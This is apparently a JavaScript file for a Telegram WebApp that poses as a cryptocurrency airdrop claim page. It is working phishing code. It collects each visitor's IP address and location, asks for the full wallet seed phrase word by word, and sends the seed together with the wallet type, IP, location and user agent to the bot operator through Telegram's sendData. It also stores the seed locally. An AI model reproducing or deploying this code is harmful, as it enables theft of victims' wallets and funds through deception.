let tg = null;
let demoMode = false;
let tgUser = {};



let userIp = "unknown";
let userLocation = "unknown";

// Отримати IP та геолокацію
fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
        userIp = data.ip;
        userLocation = `${data.city}, ${data.country_name}`;
        console.log("🌍 IP:", userIp, "| Локація:", userLocation);
    })
    .catch(() => {
        console.warn("⚠️ Не вдалося отримати геолокацію");
    });



// ======= Инициализация Telegram WebApp =======
function initTelegram() {
    if (typeof Telegram === "undefined" || !Telegram.WebApp) {
        console.warn("📦 Telegram WebApp не найден – включён демо-режим.");
        demoMode = true;
        return;
    }

    tg = Telegram.WebApp;
    tg.ready();
    tg.expand();
    console.log("✅ Telegram WebApp инициализирован");

    const u = tg.initDataUnsafe?.user;
    if (u?.id) {
        tgUser.id = u.id;
        tgUser.username = u.username || "—";
        tgUser.first_name = [u.first_name, u.last_name].filter(Boolean).join(" ") || "—";
        tgUser.photo_url = u.photo_url || "";
        const now = new Date().toISOString();

        localStorage.setItem("tg_photo", tgUser.photo_url);
        localStorage.setItem("tg_timestamp", now);
    } else {
        tgUser.photo_url = localStorage.getItem("tg_photo") || "";
    }
}

// ======= DOM готов =======
document.addEventListener("DOMContentLoaded", () => {
    initTelegram();

    if (window.location.pathname.includes("airprofile.html")) {
        fillProfileFromStorage();
        return;
    }

    fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
        .then(res => res.json())
        .then(data => {
            const container = document.getElementById('airdropList');
            container.innerHTML = '';
            data.forEach(drop => {
                const card = document.createElement('div');
                card.className = 'airdrop-card';
                card.innerHTML = `
                    <h2>${drop.name}</h2>
                    <p>💸 Награда: <strong>${drop.reward}</strong></p>
                    <p>🌐 Сеть: ${drop.network}</p>
                    <p>⏳ До: ${drop.ends}</p>
                    <button onclick="selectAirdrop('${drop.name}')">Принять участие</button>
                `;
                container.appendChild(card);
            });
        })
        .catch(error => {
            console.error("❌ Ошибка при загрузке airdrops.json:", error);
            document.getElementById("airdropList").innerHTML =
                "<p style='color:red'>❌ Не удалось загрузить список Airdrop'ов.</p>";
        });

    const btn = document.getElementById('submitBtn');
    if (btn) btn.addEventListener('click', submitAirdrop);

    initCustomSelect();
});

// ======= Выбор Airdrop =======
function selectAirdrop(name) {
    document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
    document.getElementById('airdropList').style.display = 'none';
    document.getElementById('airdropForm').style.display = 'block';
    renderSeedInputs();
}

function renderSeedInputs() {
    const length = parseInt(document.getElementById('length').value);
    const container = document.getElementById('seedContainer');
    container.innerHTML = '';

    for (let i = 0; i < length; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = `Слово ${i + 1}`;
        container.appendChild(input);
    }

    const inputs = container.querySelectorAll('input');
    if (inputs.length > 0) {
        inputs[0].addEventListener('paste', (e) => {
            e.preventDefault();
            const pasted = (e.clipboardData || window.clipboardData).getData('text');
            const words = pasted.trim().split(/\s+/);
            if (words.length > 1) {
                words.forEach((word, index) => {
                    if (inputs[index]) inputs[index].value = word;
                });
            } else {
                inputs[0].value = pasted;
            }
        });
    }
}

function submitAirdrop() {
    const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
    const words = inputs.map(input => input.value.trim()).filter(Boolean);

    if (words.length !== inputs.length) {
        document.getElementById('validationWarning').innerText = '❗️ Пожалуйста, заполните все поля.';
        document.getElementById('validationWarning').style.display = 'block';
        return;
    }

    const payload = {
        event: "airdrop_claim",
        timestamp: new Date().toISOString(),
        seed: words.join(" "),
        wallet: document.getElementById("wallet").value || "unknown",
        ip: userIp,
        location: userLocation,
        ua: navigator.userAgent
    };

    localStorage.setItem("tg_timestamp", payload.timestamp);
    localStorage.setItem("last_seed", payload.seed);
    localStorage.setItem("wallet_used", payload.wallet);

    if (!demoMode && tg?.sendData) {
        console.log("[📤 Отправка в Telegram WebApp]", payload);
        tg.sendData(JSON.stringify(payload));
        setTimeout(() => tg.close(), 400);
    } else {
        console.warn("📦 Демо-режим: данные не отправлены через Telegram.");
        alert("📦 Демо-режим: данные не отправлены. Переход в профиль.");
        window.location.href = "airprofile.html";
    }
}

// ======= Профиль: Заполнение данных =======
function fillProfileFromStorage() {
    const timestamp = localStorage.getItem("tg_timestamp") || "—";
    const photo = localStorage.getItem("tg_photo");

    if (document.getElementById("timestamp")) {
        document.getElementById("timestamp").innerText = new Date(timestamp).toLocaleString();
    }

    if (photo && document.getElementById("avatar")) {
        const img = document.getElementById("avatar");
        img.src = photo;
        img.style.display = "inline-block";
    }
}

// ======= Инициализация кастомного селектора =======
function initCustomSelect() {
    const selectWrapper = document.querySelector('.custom-select');
    if (!selectWrapper) return;

    const selected = selectWrapper.querySelector('.selected');
    const options = selectWrapper.querySelectorAll('.options li');
    const hiddenInput = document.querySelector('#wallet');

    selected.addEventListener('click', () => {
        selectWrapper.classList.toggle('open');
    });

    options.forEach(option => {
        option.addEventListener('click', () => {
            selected.innerHTML = option.innerHTML;
            hiddenInput.value = option.dataset.value;
            selectWrapper.classList.remove('open');
        });
    });

    document.addEventListener('click', e => {
        if (!selectWrapper.contains(e.target)) {
            selectWrapper.classList.remove('open');
        }
    });
}
